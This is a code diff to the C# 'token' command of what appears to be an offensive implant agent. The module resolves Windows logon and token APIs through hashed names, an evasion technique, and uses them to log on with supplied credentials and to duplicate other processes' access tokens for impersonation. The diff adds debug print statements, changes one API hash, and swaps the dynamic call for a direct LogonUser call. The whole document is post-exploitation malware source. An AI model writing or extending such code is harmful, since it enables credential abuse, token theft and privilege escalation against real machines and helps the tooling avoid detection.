@@ -15,7 +15,7 @@ namespace Agent
         public string Name => "token";
         private IMessageManager messageManager { get; set; }
         private ITokenManager tokenManager { get; set; }
-        private delegate bool logonUsrDelegate(string lpszUserName, string lpszDomain, string lpszPassword, Native.LogonType dwLogonType, Native.LogonProvider dwLogonProvider, out SafeAccessTokenHandle phToken);
+        private delegate bool logonUsrDelegate(string lpszUserName, string lpszDomain, string lpszPassword, Native.LogonType dwLogonType, Native.LogonProvider dwLogonProvider, out SafeAccessTokenHandle phToken, out object obj, out object obj2, out object obj3, out object obj4);
         private delegate bool openProcTokenDelegate(IntPtr ProcessHandle, uint desiredAccess, out SafeAccessTokenHandle TokenHandle);
         private delegate bool dupeTokenDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, Native.TOKEN_TYPE TokenType, out SafeAccessTokenHandle phNewToken);
         private delegate bool closeHandleDelegate(IntPtr hObject);
@@ -24,7 +24,7 @@ namespace Agent
         Dictionary<string, string> map = new Dictionary<string, string>()
         {
             { "ada","913D4B11CDB00C2A4496782D97EF10EE" },
-            { "lgu","C8E11F2A94EC51A77D81D5B36F11983A" },
+            { "lgu","38E3C832D929A0FAAAF6D58E8B2A1641" },
             { "opt","FC4C07508BF0023D72BF05F30D8A54A0" },
             { "dte","D16B373A40378BEA7C6E917480D4DF6E" },
             { "ch","A009186409957CF0C8AB5FD6D5451A25" },
@@ -40,6 +40,7 @@ namespace Agent
 
         private bool Resolve()
         {
+            Console.WriteLine("AdvancedAPI");
             var adaMod = Generic.GetLoadedModulePtr(map["ada"], key);
 
             if(adaMod == IntPtr.Zero)
@@ -47,8 +48,11 @@ namespace Agent
                 resolved = false;
                 return false;
             }
+            Console.WriteLine("LogonUser");
             this.luFunc = Generic.GetExportAddr(adaMod, map["lgu"], key);
+            Console.WriteLine("DuplicateTokenEx");
             this.dteFunc = Generic.GetExportAddr(adaMod, map["dte"], key);
+            Console.WriteLine("OpenProcessToken");
             this.optFunc = Generic.GetExportAddr(adaMod, map["opt"], key);
 
             if(luFunc == IntPtr.Zero || dteFunc == IntPtr.Zero || optFunc == IntPtr.Zero)
@@ -111,11 +115,17 @@ namespace Agent
                     logonType = Native.LogonType.LOGON32_LOGON_INTERACTIVE;
                 }
 
+                //object[] logonParams = new object[] { tokenOptions.username, tokenOptions.domain, tokenOptions.password, logonType, Native.LogonProvider.LOGON32_PROVIDER_DEFAULT, hToken, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
+                //bool result = Generic.InvokeFunc<bool>(luFunc, typeof(logonUsrDelegate), ref logonParams);
 
-                object[] logonParams = new object[] { tokenOptions.username, tokenOptions.domain, tokenOptions.password, logonType, Native.LogonProvider.LOGON32_PROVIDER_DEFAULT, hToken };
-                bool result = Generic.InvokeFunc<bool>(luFunc, typeof(logonUsrDelegate), ref logonParams);
-
-                if (!result)
+                if(!Native.LogonUser(
+                    tokenOptions.username,
+                    tokenOptions.domain,
+                    tokenOptions.password,
+                    tokenOptions.netOnly ? Native.LogonType.LOGON32_LOGON_NETWORK : Native.LogonType.LOGON32_LOGON_INTERACTIVE,
+                    Native.LogonProvider.LOGON32_PROVIDER_DEFAULT,
+                    out hToken
+                    ))
                 {
                     messageManager.AddResponse(new ResponseResult()
                     {
@@ -126,7 +136,7 @@ namespace Agent
                     return;
                 }
 
-                hToken = (SafeAccessTokenHandle)logonParams[5];
+                //hToken = (SafeAccessTokenHandle)logonParams[5];
                 messageManager.AddResponse(this.tokenManager.AddToken(hToken, tokenOptions, job.task.id).ToJson());
                 return;
             }
@@ -183,7 +193,6 @@ namespace Agent
                     }
 
                     hToken = (SafeAccessTokenHandle)optParams[2];
-
                     object[] dtParams = new object[] { hToken.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation, Native.TOKEN_TYPE.TokenImpersonation, dupHandle };
 
                     result = Generic.InvokeFunc<bool>(dteFunc, typeof(dupeTokenDelegate), ref dtParams);
